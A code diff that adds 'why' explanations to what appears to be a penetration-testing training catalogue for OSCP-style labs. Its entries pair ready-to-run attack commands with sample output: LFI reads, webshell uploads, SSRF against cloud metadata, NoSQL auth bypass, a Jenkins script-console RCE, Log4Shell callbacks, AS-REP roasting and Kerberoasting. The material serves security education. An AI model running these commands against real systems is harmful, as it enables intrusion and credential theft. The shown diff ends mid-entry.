@@ -221,6 +221,7 @@
 
     // ============================ WEB ============================
     'vhost-discovery': {
+      why: "One IP can host many sites, and the extra ones are usually where the bugs live: a \"dev\" or \"staging\" vhost is less hardened than the production site everyone tests. Reach for this once you have a domain name (from a TLS certificate, a redirect, or DNS) and the main site looks boring. It is cheap, and it is often the difference between \"stuck on a plain website\" and \"found the real app\". Add every vhost you discover to your hosts file so you can actually browse it.",
       cmd: 'ffuf -u http://10.10.10.10 -H "Host: FUZZ.acme.internal" -w subdomains.txt -mc 200,301,302 -fs 0', tool: 'ffuf',
       output: [
         ':: Method           : GET',
@@ -231,6 +232,7 @@
       teach: 'One IP can serve many sites by Host header. Fuzzing virtual hosts surfaces ones with no public link, a "staging" or "dev" vhost is usually less hardened than production and is where the bug lives.',
     },
     'content-discovery': {
+      why: "A website shows you only what it links to; the interesting things, admin panels, backups, an exposed .git, API routes, are reachable but hidden, and brute-forcing paths is how you find them. This is the single highest-value thing to run against any web app, so start it early and let it work in the background while you look at the site by hand. Your wordlist matters more than the tool: a bigger, smarter list finds what a tiny one walks past.",
       cmd: 'feroxbuster -u http://10.10.10.10 -w raft-medium-directories.txt -o scans/ferox.txt', tool: 'feroxbuster',
       output: [
         '200      GET       24l       68w     /index.php',
@@ -242,6 +244,7 @@
       teach: 'Brute-forcing paths uncovers what is not linked anywhere, an admin login, an uploads directory, a leaking .git. Each hit is a new place to attack; chase the interesting ones (admin, upload, config) first.',
     },
     'param-discovery': {
+      why: "A page can accept parameters that appear nowhere in its HTML, and the hidden one is often the vulnerable one, a leftover debug switch or a \"file\" parameter. Fuzzing parameter names surfaces them so you have something concrete to test for LFI, SQLi, or SSRF. Reach for it when a page looks static but you suspect there is more behind it, or when one known parameter hints at siblings. It turns \"nothing to attack here\" into a list of inputs worth probing.",
       cmd: 'arjun -u http://10.10.10.10/view.php -m GET', tool: 'arjun',
       output: [
         '[*] Scanning http://10.10.10.10/view.php',
@@ -252,6 +255,7 @@
       teach: 'A page can hide inputs that nothing links to. arjun fuzzes parameter names and watches the response change, finding a hidden "page" parameter gives you something to test for LFI, SQLi, or SSRF.',
     },
     'lfi-probe': {
+      why: "When a parameter names a file to load (page=, file=, include=), it is worth one quick traversal test, because reading arbitrary files is a short path to credentials, source code, and often a shell. The /etc/passwd read is only the proof; the payoff is config files with database passwords and, through log poisoning or PHP wrappers, code execution. Try it on any include-looking parameter. If it works you have a username list and your next several moves at once.",
       cmd: "curl -s 'http://10.10.10.10/view.php?page=../../../../etc/passwd'", tool: 'curl',
       output: [
         'root:x:0:0:root:/root:/bin/bash',
@@ -262,6 +266,7 @@
       teach: 'When /etc/passwd comes back in the page, the "page" parameter reads arbitrary files, Local File Inclusion. It confirms traversal and leaks real usernames (bmurphy); next you try log poisoning or PHP wrappers for code execution.',
     },
     'file-upload': {
+      why: "An upload form that stores a script where the web server will run it is instant RCE, which is why it is one of the first things to probe on any app that takes files. The work is all in the filter: is it checking the extension, the MIME type, the magic bytes, and can you trick it with a double extension, a faked Content-Type, or a polyglot. Confirm where the file lands before you celebrate, an accepted upload you cannot reach is not a shell.",
       cmd: 'curl -s -F "file=@shell.php" http://10.10.10.10/upload.php', tool: 'curl',
       output: [
         '{"status":"ok","stored":"/uploads/shell.php"}',
@@ -270,6 +275,7 @@
       teach: 'The upload accepted a .php file and told you where it landed. If /uploads/ executes PHP, requesting shell.php runs your code, upload-to-webshell. Many filters are weak (check extension tricks, content-type, magic bytes).',
     },
     'sqli-basics': {
+      why: "Confirm SQL injection by hand before you touch a tool, because you cannot exploit (or, on the exam, explain) what you do not understand. A single quote that changes the response, an error, a different result, a timing shift, is the whole signal. Do this the instant a parameter looks like it reaches a database. Getting the injection type right here, error-based, boolean-blind, or time-blind, decides every step that follows, so slow down and read what the app tells you.",
       cmd: "curl -s 'http://10.10.10.10/page.php?id=1%27'", tool: 'curl',
       output: [
         'You have an error in your SQL syntax; check the manual that',
@@ -279,6 +285,7 @@
       teach: 'A single quote that throws a SQL error means your input reaches the query unescaped, the first proof of SQL injection. From here you find the column count and start extracting data (or hand it to sqlmap).',
     },
     'sqlmap-automation': {
+      why: "Once you have confirmed injection by hand, sqlmap automates the tedious part: dumping tables, reading files, sometimes landing a shell. The rule you must internalise is that sqlmap is banned on the OSCP exam, so treat this as a lab-only accelerator and make sure you can do the same extraction manually. Reach for it in labs to save time after you already understand the bug, never as a way to discover bugs you have not verified.",
       cmd: 'sqlmap -r request.txt --batch --level=3 --risk=2 --dump', tool: 'sqlmap',
       output: [
         "[INFO] GET parameter 'id' is 'MySQL >= 5.0 boolean-based blind' injectable",
@@ -292,6 +299,7 @@
       teach: 'Once you have confirmed injection by hand, sqlmap automates the extraction, it enumerates databases, tables, and dumps rows. Those password hashes go straight to your cracker. Use -r with a saved request so it tests the real parameters.',
     },
     'git-exposed': {
+      why: "A site deployed by git that left its /.git folder readable hands you the entire source history, and history is where secrets hide: a password in an old commit, a config file, an API key someone \"removed\" later but never scrubbed. Check /.git/HEAD on every web app, it is a one-request test with an outsized payoff. When it is there, reconstruct the repo and read the code, you are no longer testing blind.",
       cmd: 'git-dumper http://10.10.10.10/.git/ gitloot', tool: 'git-dumper',
       output: [
         '[+] Testing http://10.10.10.10/.git/HEAD [200]',
@@ -304,6 +312,7 @@
       teach: 'An exposed .git/ directory lets git-dumper reconstruct the whole source tree, including secrets committed by mistake. A database password in config.php is a free credential and a read of exactly how the app works.',
     },
     'svn-exposed': {
+      why: "The Subversion version of an exposed .git: an old deployment left /.svn/ behind, and its entries and pristine copies rebuild the whole working tree, source and secrets included. It turns up on legacy apps, and there is sometimes an SVN service on 3690 that allows an anonymous checkout. Check it when the stack looks dated or when .git came up empty. Like the git case, it flips you from guessing to reading the real code.",
       cmd: 'curl -s http://10.10.10.10/.svn/entries', tool: 'curl',
       output: [
         '10',
@@ -316,6 +325,7 @@
       teach: 'An exposed .svn/ directory leaks the source tree the way .git/ does. The entries file lists real filenames, db_connect.php likely holds database credentials. Reconstruct the files and read them.',
     },
     'ssrf': {
+      why: "Any feature that fetches a URL for you (link previews, webhooks, \"import from URL\", image loaders, PDF generators) can be turned into a request from the server's point of view, which reaches what you cannot: internal services, admin panels bound to localhost, cloud metadata. Reach for it whenever the app takes a URL. The classic lab win is reading 169.254.169.254 for cloud credentials; the general win is using the server as your proxy into the network behind it.",
       cmd: "curl -s 'http://10.10.10.10/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin'", tool: 'curl',
       output: [
         '{',
@@ -328,6 +338,7 @@
       teach: 'Server-Side Request Forgery makes the server fetch a URL you choose. Pointed at the cloud metadata endpoint (169.254.169.254) it leaks IAM credentials; pointed inside, it reaches services the firewall hides. The server is your proxy into places you cannot reach.',
     },
     'ssti': {
+      why: "Template injection is RCE hiding behind a friendly feature, a name field, a search box, an email template, that passes your input through a server-side template engine. The famous {{7*7}} test is just the detector: if 49 comes back, the server is executing template code, and template code reaches a shell. Try it wherever your input is reflected into a page. Which engine you hit (Jinja2, Twig, Freemarker) decides the exact payload, so fingerprint it before you escalate.",
       cmd: "curl -s 'http://10.10.10.10/hello?user={{7*7}}'", tool: 'curl',
       output: [
         '<h1>Hello 49</h1>',
@@ -336,6 +347,7 @@
       teach: 'You sent {{7*7}} and the page returned 49, the template engine evaluated your input instead of printing it. Server-Side Template Injection often escalates straight to remote code execution; identify the engine, then build the RCE payload.',
     },
     'xxe': {
+      why: "Anywhere an app parses XML (file uploads, SOAP or REST APIs, SAML, even .docx and .xlsx), the parser may resolve external entities you define, which becomes file reads, SSRF, and occasionally RCE. Find the XML parsers by sending XML or flipping the Content-Type to application/xml and watching for a change in behaviour. Reach for it on any XML-accepting endpoint. The reliable prize is reading local files; the richer one is pivoting the parser into SSRF.",
       cmd: 'curl -s -X POST http://10.10.10.10/api -H "Content-Type: application/xml" --data-binary @xxe.xml', tool: 'curl',
       output: [
         '<result>',
@@ -347,6 +359,7 @@
       teach: 'XML External Entity injection abuses a parser that resolves external entities. Your payload declares one pointing at file:///etc/passwd and the response echoes the file back. Any endpoint that accepts XML is worth testing.',
     },
     'deserialization': {
+      why: "When an app rebuilds objects from data it trusts, serialized blobs in cookies, ViewState, or API bodies, a crafted blob can run code during that rebuild. Recognise the markers (Java rO0AB, .NET __VIEWSTATE, PHP O:4:), because the exploit is language-specific and gadget-chain heavy, so this is a \"know it when you see it\" move more than a blind probe. Reach for it when you spot a serialized blob under your control; it is high-impact but rarely the first thing to try.",
       signal: 'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 41122',
       teach: 'When an app deserialises attacker-controlled data, a crafted object (ysoserial builds them) runs code as it is rebuilt. Start a listener, then POST the gadget blob, the app runs it and dials back to you. Look for serialised data in cookies, parameters, and APIs.',
       steps: [
@@ -359,6 +372,7 @@
       ],
     },
     'jwt-attacks': {
+      why: "A JSON Web Token is only as strong as its signing secret and the server's verification code, and apps get both wrong constantly. Work the ladder: decode and read the claims, try alg:none, crack a weak HMAC secret offline, and if you hold the source, abuse key confusion. Reach for it whenever auth rides in a JWT. The quick wins, a none-alg token or a guessable secret, are worth a two-minute check on every token you see.",
       cmd: "echo $TOKEN | cut -d. -f2 | base64 -d", tool: 'sh',
       output: [
         '{"user":"guest","role":"user","iat":1700000000}',
@@ -367,6 +381,7 @@
       teach: 'Decode the token first, the middle segment is the claims. If the server accepts alg:none, or the HMAC secret is weak enough to crack (hashcat -m 16500), you re-sign a token that says role:admin. The claims tell you exactly what to tamper with.',
     },
     'nosql-injection': {
+      why: "MongoDB-backed logins often accept operator objects where they expect strings, so user[$ne]=x&pass[$ne]=x means \"not equal to x\", which is always true, and you log in as the first user (usually admin) with no password at all. Reach for it the moment a login talks to a NoSQL backend, or JSON is accepted where a plain string belongs. It is one of the fastest auth bypasses there is, so test it before you try to brute-force anything.",
       cmd: "curl -s -i -X POST http://10.10.10.10/login -d 'user[$ne]=x&pass[$ne]=x'", tool: 'curl',
       output: [
         'HTTP/1.1 302 Found',
@@ -377,6 +392,7 @@
       teach: 'NoSQL backends like MongoDB take query operators as input. {"$ne":"x"} means "not equal to x" (always true), so the login matches the first user and you are in without a password. Test JSON and array parameters against NoSQL apps.',
     },
     'tomcat-deploy': {
+      why: "A reachable Tomcat Manager plus any valid credential is code execution: you deploy a WAR webshell and it runs as the Tomcat service account. The credentials come from defaults (tomcat:tomcat, admin:admin) or from a tomcat-users.xml you read through LFI. Reach for it whenever you see Tomcat and have, or can guess, manager creds. Build the WAR on your own box first; \"OK - Deployed\" means your shell is live and waiting.",
       signal: 'OK - Deployed application at context path [/shell]',
       teach: 'Tomcat Manager with valid creds lets you deploy a WAR (your own app) which runs as the Tomcat service account. First build the WAR on your box, then upload it; "OK - Deployed" means your JSP shell is live at /shell. Request it to get code execution.',
       steps: [
@@ -389,6 +405,7 @@
       ],
     },
     'jenkins-access': {
+      why: "Jenkins is a build server, so running code is its whole job, which means any near-admin access is a shell: the Groovy Script Console runs as the Jenkins user, and so does a build step. Even unauthenticated instances leak secrets and job configs. Reach for it whenever 8080 shows Jenkins; check for no-auth access first, then the Script Console. On Windows build nodes this is frequently your foothold onto the domain.",
       cmd: "curl -s http://10.10.10.10:8080/script --data-urlencode 'script=println \"id\".execute().text'", tool: 'curl',
       output: [
         'uid=0(root) gid=0(root) groups=0(root)',
@@ -397,6 +414,7 @@
       teach: 'Jenkins\' Script Console runs arbitrary Groovy as the Jenkins service, often root or a privileged build account. If /script is reachable, it is remote code execution by design. CI servers are high-value: they hold credentials and run privileged.',
     },
     'wordpress': {
+      why: "WordPress core is usually solid; its plugins and themes are not, so the game is enumeration, list the plugins, themes, users and versions with wpscan, then match a version to a known CVE. With admin credentials you skip straight to code execution by editing a theme file or uploading a plugin zip. Reach for it the instant you fingerprint WordPress, and map the third-party plugins first, because the vulnerable plugin is almost always the way in.",
       cmd: 'wpscan --url http://10.10.10.10 --enumerate u,vp --api-token $WPSCAN_API', tool: 'wpscan',
       output: [
         '[+] URL: http://10.10.10.10/  [10.10.10.10]',
@@ -408,6 +426,7 @@
       teach: 'wpscan maps a WordPress site: core version, plugins, and users. Plugins are where WordPress boxes fall, a vulnerable one like wp-file-manager is often a direct RCE. The enumerated users feed a login brute if you need one.',
     },
     'nikto-scan': {
+      why: "Nikto is a shotgun: it checks thousands of known-bad files, stale server versions, and default apps that targeted content discovery can miss. The tradeoff is that it is slow and very loud, so fire it early and let it run in the background while you work the app by hand, not as something you sit and wait on. Read its output as leads to verify, not as findings, it false-positives, and a noisy scan never replaces looking at the site yourself.",
       cmd: 'nikto -h http://10.10.10.10 -o scans/nikto.txt', tool: 'nikto',
       output: [
         '+ Server: Apache/2.4.49 (Unix)',
@@ -419,6 +438,7 @@
       teach: 'Nikto is a fast first pass that flags the obvious, default files, an exposed /admin, a dated banner. Treat each hit as a lead to chase by hand, not a finding on its own.',
     },
     'command-injection': {
+      why: "When a parameter flows into a system command (ping tools, DNS lookups, file converters, PDF makers), you can append your own command and the server runs it, which is direct RCE. Confirm with a harmless probe first (;id), then enumerate, then go for a shell, in that order, so you understand the context before you commit to a payload. Reach for it on any feature that smells like it shells out; it is one of the most reliable RCE classes on lab boxes.",
       cmd: "curl -s 'http://10.10.10.10/ping.php?ip=127.0.0.1;id'", tool: 'curl',
       output: [
         'PING 127.0.0.1 (127.0.0.1): 56 data bytes',
@@ -429,6 +449,7 @@
       teach: 'The app ran your ;id alongside its ping, the uid=www-data line is the web server executing your command. That is command injection, and it is a direct path to a reverse shell as the web user.',
     },
     'idor': {
+      why: "Every request that names an object by id (?uid=5, /api/users/123) asks a question the server often forgets to answer: is it checking WHO is asking, or only WHAT they asked for. Make two accounts, then try to read account A's data while logged in as B; if it works, that is IDOR. Reach for it on anything that references objects by a guessable id. It needs no exploit code, just changing a number, which is exactly why it is worth checking everywhere.",
       cmd: "curl -s 'http://10.10.10.10/account?id=1002' -H 'Cookie: session=<yours>'", tool: 'curl',
       output: [
         '{"id":1002,"name":"Alice Renner","email":"alice@acme.internal",',
@@ -438,6 +459,7 @@
       teach: 'You changed id=1001 (yours) to id=1002 and got someone else\'s record, an Insecure Direct Object Reference. The app checks that you are logged in, but not that the object is yours. Walk the IDs to harvest other users\' data.',
     },
     'verb-tampering': {
+      why: "Access rules are frequently written for GET and POST only, so hitting the same protected URL with HEAD, PUT, OPTIONS, or PATCH can walk straight past the check. OPTIONS also tells you which verbs the server allows, and a permitted PUT can let you upload a shell outright. Reach for it when a path is forbidden (401/403) but looks important; it is a thirty-second test that now and then hands you the whole thing.",
       cmd: 'curl -s -X OPTIONS -i http://10.10.10.10/admin/', tool: 'curl',
       output: [
         'HTTP/1.1 200 OK',
@@ -447,6 +469,7 @@
       teach: 'OPTIONS tells you which verbs the server accepts. PUT in the list on /admin/ is a red flag, you may be able to upload a web shell with a PUT, no injection needed. Enumerate methods before assuming a path is locked down.',
     },
     'web-shells': {
+      why: "Once you can write a file into the webroot, through an upload, LFI-to-log, a SQL OUTFILE, or a PUT, you still need a shell file that matches the server's language, and Kali ships vetted ones (Laudanum, the webshells collection). This step is about picking the right payload for the stack, php versus aspx versus jsp, so your write actually executes. Reach for it the moment you hold a write primitive, and prefer a minimal webshell: you only need enough to catch a proper reverse shell.",
       cmd: "curl -s 'http://10.10.10.10/uploads/cmd.php?c=id'", tool: 'curl',
       output: [
         'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
@@ -455,6 +478,7 @@
       teach: 'Once your uploaded web shell runs commands (?c=id returns www-data), you have code execution, but one command per request is clumsy. The very next move is to turn it into a proper interactive reverse shell.',
     },
     'xss-basics': {
+      why: "On a lab box XSS is rarely the goal itself; it is a way to steal an admin's session or make their browser fetch something only they can reach. So the real question is not \"does it pop an alert\" but \"is there a privileged user who will view my payload\". Reach for it when the app has an admin who reviews user content, a support ticket, a comment, a profile field. Without a victim to trigger it, stored XSS is a dead end, spend your time elsewhere.",
       cmd: "curl -s 'http://10.10.10.10/search.php?q=<b>xssprobe123</b>'", tool: 'curl',
       output: [
         '<p>No results for <b>xssprobe123</b></p>',
@@ -463,6 +487,7 @@
       teach: 'Your <b> tag came back rendered, not escaped, the page reflects input into HTML unsanitised. That is reflected XSS: it runs in a victim\'s browser, useful for stealing a session. On OSCP it matters most where it can reach an admin.',
     },
     'check-log4shell': {
+      why: "Log4Shell is worth a quick spray on any Java app because the check is cheap and the payoff is pre-auth RCE: a vulnerable Log4j resolves a ${jndi:ldap://you/} string you place in a header or field and calls back to your server. You confirm it out-of-band by watching a listener, no callback means no bug. Reach for it when the stack is Java and the box feels dated. It is a CVE, not a design flaw, so it is a yes/no check, not an exploration.",
       signal: 'Received LDAP query from 10.10.10.10 for object /a',
       teach: 'Log4Shell (CVE-2021-44228) triggers when a vulnerable Log4j logs your ${jndi:ldap://...} string and dutifully connects out to it. Stand up a listener first, then inject the string, the inbound LDAP hit confirms the callback, the first step before staging a full exploit.',
       steps: [
@@ -474,6 +499,7 @@
       ],
     },
     'check-struts2': {
+      why: "Apache Struts2 evaluates an OGNL expression hidden in the Content-Type header, so one crafted request runs a command and returns its output: pre-auth RCE from a single curl. Unlike Log4Shell this one is in-band, the command output comes straight back, so you confirm it immediately. Reach for it when you fingerprint Struts2 (CVE-2017-5638); it is a fast, high-impact check to run before you invest time in anything slower.",
       cmd: 'curl -sSk http://10.10.10.10/ -H "Content-Type: %{(#cmd=\'id\')...OGNL...}"', tool: 'curl',
       output: [
         'uid=0(root) gid=0(root) groups=0(root)',
@@ -484,6 +510,7 @@
 
     // ============================ SERVICE & WEB CHECKS ============================
     'check-tls-config': {
+      why: "This is a free report finding, not an exploit. An expired or self-signed certificate and old protocols like SSLv3 or TLS 1.0 are low-severity but real, and nmap's ssl scripts read them without touching the app. Run it on any TLS service when you want to round out the findings section; it costs nothing and never risks the box. Do not expect a foothold from it, expect a defensible bullet point in the report.",
       cmd: 'nmap --script ssl-cert,ssl-enum-ciphers -p 443 10.10.10.10', tool: 'nmap',
       output: [
         '| ssl-cert: Subject: commonName=dev.acme.internal',
@@ -496,6 +523,7 @@
       teach: 'A TLS certificate leaks names. The Subject and SAN fields often reveal internal hostnames (like vault.acme.internal) you had no other way to discover. The cipher list and expiry are reporting findings too.',
     },
     'check-http-methods': {
+      why: "A one-request check for a classic misconfiguration: an OPTIONS request lists which HTTP verbs the server allows, and dangerous ones (PUT, DELETE, TRACE) are reportable on their own. It also feeds verb-tampering: a permitted PUT can mean you upload a shell. Run it on any web server; it is instant and exam-safe. Treat an enabled PUT or DELETE as a lead to chase, not just a line in the report.",
       cmd: 'curl -sSIkLX OPTIONS http://10.10.10.10/', tool: 'curl',
       output: [
         'HTTP/1.1 200 OK',
@@ -505,6 +533,7 @@
       teach: 'OPTIONS reports which verbs the server accepts. PUT or DELETE in the list is a red flag, PUT can mean you upload a web shell directly, no injection needed.',
     },
     'check-cors': {
+      why: "A permissive CORS policy, reflecting any Origin you send or allowing \"null\", lets a malicious site read authenticated responses, which is a genuinely high-value web finding. One request with a spoofed Origin header settles it. Run it whenever the app has authenticated data that is reachable cross-origin. It is a report win that now and then escalates into real data theft.",
       cmd: 'curl -sSIkL -H "Origin: https://evil.example" http://10.10.10.10/api/me', tool: 'curl',
       output: [
         'HTTP/1.1 200 OK',
@@ -515,6 +544,7 @@
       teach: 'The server reflected your arbitrary Origin AND allows credentials, a CORS misconfiguration. A malicious page could read a logged-in victim\'s API responses, including their data and tokens. Reflected Origin + credentials:true is the dangerous pair.',
     },
     'check-http-redirect': {
+      why: "A plain-HTTP site that serves content instead of redirecting to HTTPS exposes everything in transit, a standard report finding. A single HEAD of http:// (without following redirects) shows whether it redirects or serves in the clear. Run it as part of your web hygiene checks; it is one request and never touches application logic. Low severity, but it belongs in every report.",
       cmd: 'curl -sSIk http://10.10.10.10/', tool: 'curl',
       output: [
         'HTTP/1.1 301 Moved Permanently',
@@ -524,6 +554,7 @@
       teach: 'A redirect can leak an internal hostname in its Location header, dev-internal.acme.internal is a name you had no other way to learn. Add it to /etc/hosts and your target list; the redirect just widened the attack surface.',
     },
     'check-subdomain-takeover': {
+      why: "When a DNS name is a CNAME pointing at a third-party service (S3, GitHub Pages, Heroku) that nobody owns anymore, you can register it yourself and take over the name, which is high impact for one DNS lookup. Run it when you have subdomains and some of their CNAMEs point off-site. Most will be claimed; the one dangling CNAME is worth the whole exercise.",
       cmd: 'dig +noall +answer CNAME shop.acme.internal', tool: 'dig',
       output: [
         'shop.acme.internal.  300  IN  CNAME  acme-shop.herokuapp.com.',
@@ -532,6 +563,7 @@
       teach: 'A CNAME pointing at a cloud service that is no longer claimed is a subdomain takeover: register the dangling target yourself and you control content on the victim\'s trusted subdomain. Confirm by visiting it and seeing an unclaimed-app page.',
     },
     'check-dns-email': {
+      why: "Missing or permissive SPF and DMARC records mean the domain can be spoofed in phishing, a routine report finding whenever the engagement scope includes a domain. Two TXT lookups answer it, with no scanning. Run it when you have a domain in scope. It will not get you a shell, but it is a reliable, defensible finding for the report.",
       cmd: 'dig +short TXT _dmarc.acme.internal', tool: 'dig',
       output: [
         '"v=DMARC1; p=none; rua=mailto:dmarc@acme.internal"',
@@ -540,6 +572,7 @@
       teach: 'Email records say whether a domain can be spoofed. DMARC p=none means forged mail from this domain is unlikely to be rejected, a phishing lead in a real engagement, a reporting finding on the exam.',
     },
     'check-web-headers': {
+      why: "Security headers are the easiest report wins there are: a missing HSTS, CSP, or X-Frame-Options, or a Server header leaking the exact version. One HEAD request surfaces them all. Run it on every web app early; it costs nothing and never risks the target. The leaked version header also feeds your CVE search, so read it for leads, not just findings.",
       cmd: 'curl -sSIkL http://10.10.10.10/', tool: 'curl',
       output: [
         'HTTP/1.1 200 OK',
@@ -551,6 +584,7 @@
       teach: 'Response headers hand you the stack for free and show what protections are missing. X-Powered-By leaks the PHP version; the absence of CSP and X-Frame-Options are reporting findings. Read the headers before anything clever.',
     },
     'check-web-components': {
+      why: "Before any CVE can fire you have to know exactly what the app is built from, and this reads the page's script sources, generator meta, Server header, and framework cookies to fingerprint the components and versions. It is the input the CVE catalog matches against. Run it on every web app right after triage; a precise fingerprint is what turns \"maybe vulnerable\" into a named exploit to try.",
       cmd: 'curl -sSikL http://10.10.10.10/', tool: 'curl',
       output: [
         'HTTP/1.1 200 OK',
@@ -562,6 +596,7 @@
       teach: 'Between the headers and the page body, the component stack is usually visible, here a generator meta tag names Joomla 3.9. A pinned CMS version maps straight to known exploits; identify it before you attack.',
     },
     'check-cms-version': {
+      why: "Fingerprinting the CMS tells you what it is; pinning the exact version tells you whether its known CVEs apply, and version-gated exploits fail silently against the wrong build. This reads the files that publish the version (CHANGELOG, readme, composer.lock). Run it once you know the CMS and want to match it to an exploit. The exact version is the difference between a working CVE and a wasted hour.",
       cmd: 'curl -sSkL http://10.10.10.10/CHANGELOG.txt', tool: 'curl',
       output: [
         'Drupal 7.57, 2018-02-21',
@@ -571,6 +606,7 @@
       teach: 'CMSes leak their version in changelogs, readme files, and meta tags. A pinned version like Drupal 7.57 maps straight to known exploits (here Drupalgeddon2, CVE-2018-7600). Identify the CMS and its exact build, then look up what breaks it.',
     },
     'check-web-body': {
+      why: "Reading the page body catches findings the header checks miss: insecure http:// resource references on an HTTPS page, a login form that allows autocomplete, a POST form with no anti-CSRF token. One GET surfaces them. Run it as part of your web review; it is read-only and exam-safe. Small findings individually, but they round out the report and sometimes flag a form worth attacking.",
       cmd: 'curl -sSkL http://10.10.10.10/', tool: 'curl',
       output: [
         '<form action="/login.php" method="post">',
@@ -581,6 +617,7 @@
       teach: 'View the source. Developers leave credentials, debug endpoints, and TODOs in HTML comments and JavaScript all the time. A test/test login left in a comment is a free set of working credentials, read the page humans never read.',
     },
     'check-exposed-files': {
+      why: "A quick GET of the usual leaked paths, a .git tree, a .env, server-status, an editor backup, turns up source and secrets that were never meant to be web-served. It is read-only and takes seconds. Run it on every web app; the payoff is wildly out of proportion to the effort, a single readable .env can hand you database and API credentials outright.",
       cmd: 'curl -sSkL http://10.10.10.10/.env', tool: 'curl',
       output: [
         'APP_ENV=production',
@@ -593,6 +630,7 @@
 
     // ============================ ACTIVE DIRECTORY ============================
     'ad-dc-identify': {
+      why: "Nothing in the AD playbook works until you know the domain name and which host is the DC, so this is the mandatory first step the moment a scan shows the AD fingerprint (88, 389, 445 together). It names the domain and finds the DC, and those two facts feed every later command, impacket, nxc, and kerbrute all need the domain and the DC IP. Getting the domain FQDN exactly right matters, Kerberos is picky, and a wrong domain name is behind half the \"impacket is broken\" complaints.",
       cmd: "nxc ldap 10.10.10.10 -u '' -p ''", tool: 'nxc',
       output: [
         'SMB   10.10.10.10  445  DC01  [*] Windows Server 2019 Build 17763 (name:DC01) (domain:acme.internal)',
@@ -603,6 +641,7 @@
       teach: 'nxc against LDAP names the host (DC01) and the domain (acme.internal) and gives the base DN, the three facts every later AD command needs. Kerberos (88) + LDAP (389) + SMB (445) on one host is the fingerprint of a Domain Controller.',
     },
     'ad-anon-ldap-enum': {
+      why: "Many lab DCs allow an anonymous LDAP bind, and when they do it hands you the base DN and often the entire user and group list, description fields included, where admins love to stash a password \"temporarily\". It costs one unauthenticated query. Reach for it right after identifying the DC, before you hold any credential. A user list from here is the raw material for roasting and spraying, so it often bootstraps your whole domain attack.",
       cmd: "nxc ldap 10.10.10.10 -u '' -p '' --users", tool: 'nxc',
       output: [
         'LDAP  10.10.10.10  389  DC01  [*] Enumerated domain users',
@@ -615,6 +654,7 @@
       teach: 'If anonymous LDAP bind is allowed, you can list every domain user with no credentials at all. That user list is the raw material for AS-REP roasting and password spraying, the two no-creds ways into the domain.',
     },
     'ad-user-enum': {
+      why: "Kerberos is an oracle: the KDC answers differently for real usernames than fake ones, so you can confirm valid accounts with no credential at all, and a null SMB session sometimes lists them over RPC too. Reach for it early when you need a user list and anonymous LDAP did not give you one. A verified username list is the prerequisite for AS-REP roasting and spraying, you cannot spray passwords at users you have not confirmed exist.",
       cmd: 'kerbrute userenum --dc 10.10.10.10 -d acme.internal users.txt', tool: 'kerbrute',
       output: [
         '2026/09/17 10:41:02 >  Using KDC(s): 10.10.10.10:88',
@@ -626,6 +666,7 @@
       teach: 'kerbrute asks the KDC (port 88) whether each username exists, valid names get a different Kerberos error than bad ones, and it never submits a password, so it does not lock accounts. A confirmed list feeds roasting and spraying.',
     },
     'asrep-roast': {
+      why: "This is the credential-free attack everyone tries first in AD, because it needs only a username list: any account flagged DONT_REQUIRE_PREAUTH will hand out an AS-REP whose encrypted part is the user's password hash, with no login required. Reach for it the moment you have usernames. It is pure upside, you lose nothing by asking, and a single pre-auth-disabled account with a weak password can be your entire way in.",
       cmd: "nxc ldap 10.10.10.10 -u users.txt -p '' --asreproast asrep.hash", tool: 'nxc',
       output: [
         'LDAP  10.10.10.10  389  DC01  [+] tgibson has UF_DONT_REQUIRE_PREAUTH set',
@@ -635,6 +676,7 @@
       teach: 'An account with pre-auth disabled (UF_DONT_REQUIRE_PREAUTH) hands out an AS-REP encrypted with its password hash to anyone who asks, no credentials needed. Capture that $krb5asrep$ hash and crack it offline.',
     },
     'crack-asrep': {
+      why: "The $krb5asrep$ hash you roasted cracks offline on your own box, turning a configuration flaw into a real credential. Reach for it immediately after roasting. These are often service accounts with weak passwords, so rockyou frequently cracks them; if it does not, the account has a strong password and you move on. The cracked plaintext is a validated domain login, usually your first real foothold into the directory.",
       cmd: 'hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
       output: [
         '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7...e1f9:9c2d...8b:Autumn2026!',
@@ -644,6 +686,7 @@
       teach: 'The AS-REP hash (mode 18200) is encrypted with the user\'s password, so it cracks offline at full GPU speed with no lockout. "Cracked" means you now hold tgibson\'s real password, a foothold credential in the domain.',
     },
     'gpp-passwords': {
+      why: "Old Group Policy Preferences stored local-account passwords in XML under SYSVOL, a share every domain user (sometimes even anonymous) can read, and Microsoft published the AES key, so the \"encryption\" is reversible. Reach for it whenever you have any domain read access. It is a free credential sitting in a world-readable share, and the recovered local-admin password frequently reuses across many machines, which is why it is still worth checking every time.",
       cmd: "smbclient '//10.10.10.10/SYSVOL' -N -c 'recurse; ls'", tool: 'smbclient',
       output: [
         '\\acme.internal\\Policies\\{31B2F340-...}\\MACHINE\\Preferences\\Groups\\Groups.xml',
@@ -654,6 +697,7 @@
       teach: 'Group Policy Preferences stored passwords in SYSVOL encrypted with a key Microsoft published. Any domain user can read Groups.xml and decrypt the cpassword with gpp-decrypt, a free set of working credentials.',
     },
     'smb-share-inventory': {
+      why: "A readable SMB share is where admins leave what they should not: configs, backups, scripts, password files. So once you have any credential (or an anonymous session), recursively inventory every readable share, because the win is often just sitting in one. Reach for it early in the domain. It is unglamorous but high-yield, more boxes fall to a password in a share than to any clever Kerberos attack.",
       cmd: "nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!' -M spider_plus", tool: 'nxc',
       output: [
         'SMB  10.10.10.10  445  FILE01  [+] acme.internal\\jbloggs:Autumn2026!',
@@ -664,6 +708,7 @@
       teach: 'With any valid credential, spider_plus walks every readable share and lists interesting files. Scripts, spreadsheets, and configs on file shares routinely contain the next credential, loot the shares before you do anything loud.',
     },
     'kerberoast': {
+      why: "Kerberoasting is the authenticated cousin of AS-REP roasting: any domain user can request service tickets for accounts that have an SPN (service accounts), and each ticket is encrypted with that account's password hash. Reach for it as soon as you hold any domain credential. Service accounts are the target because their passwords are human-set, rarely rotated, and often over-privileged, so one crack can jump you well up the ladder.",
       cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --kerberoasting tgs.hash", tool: 'nxc',
       output: [
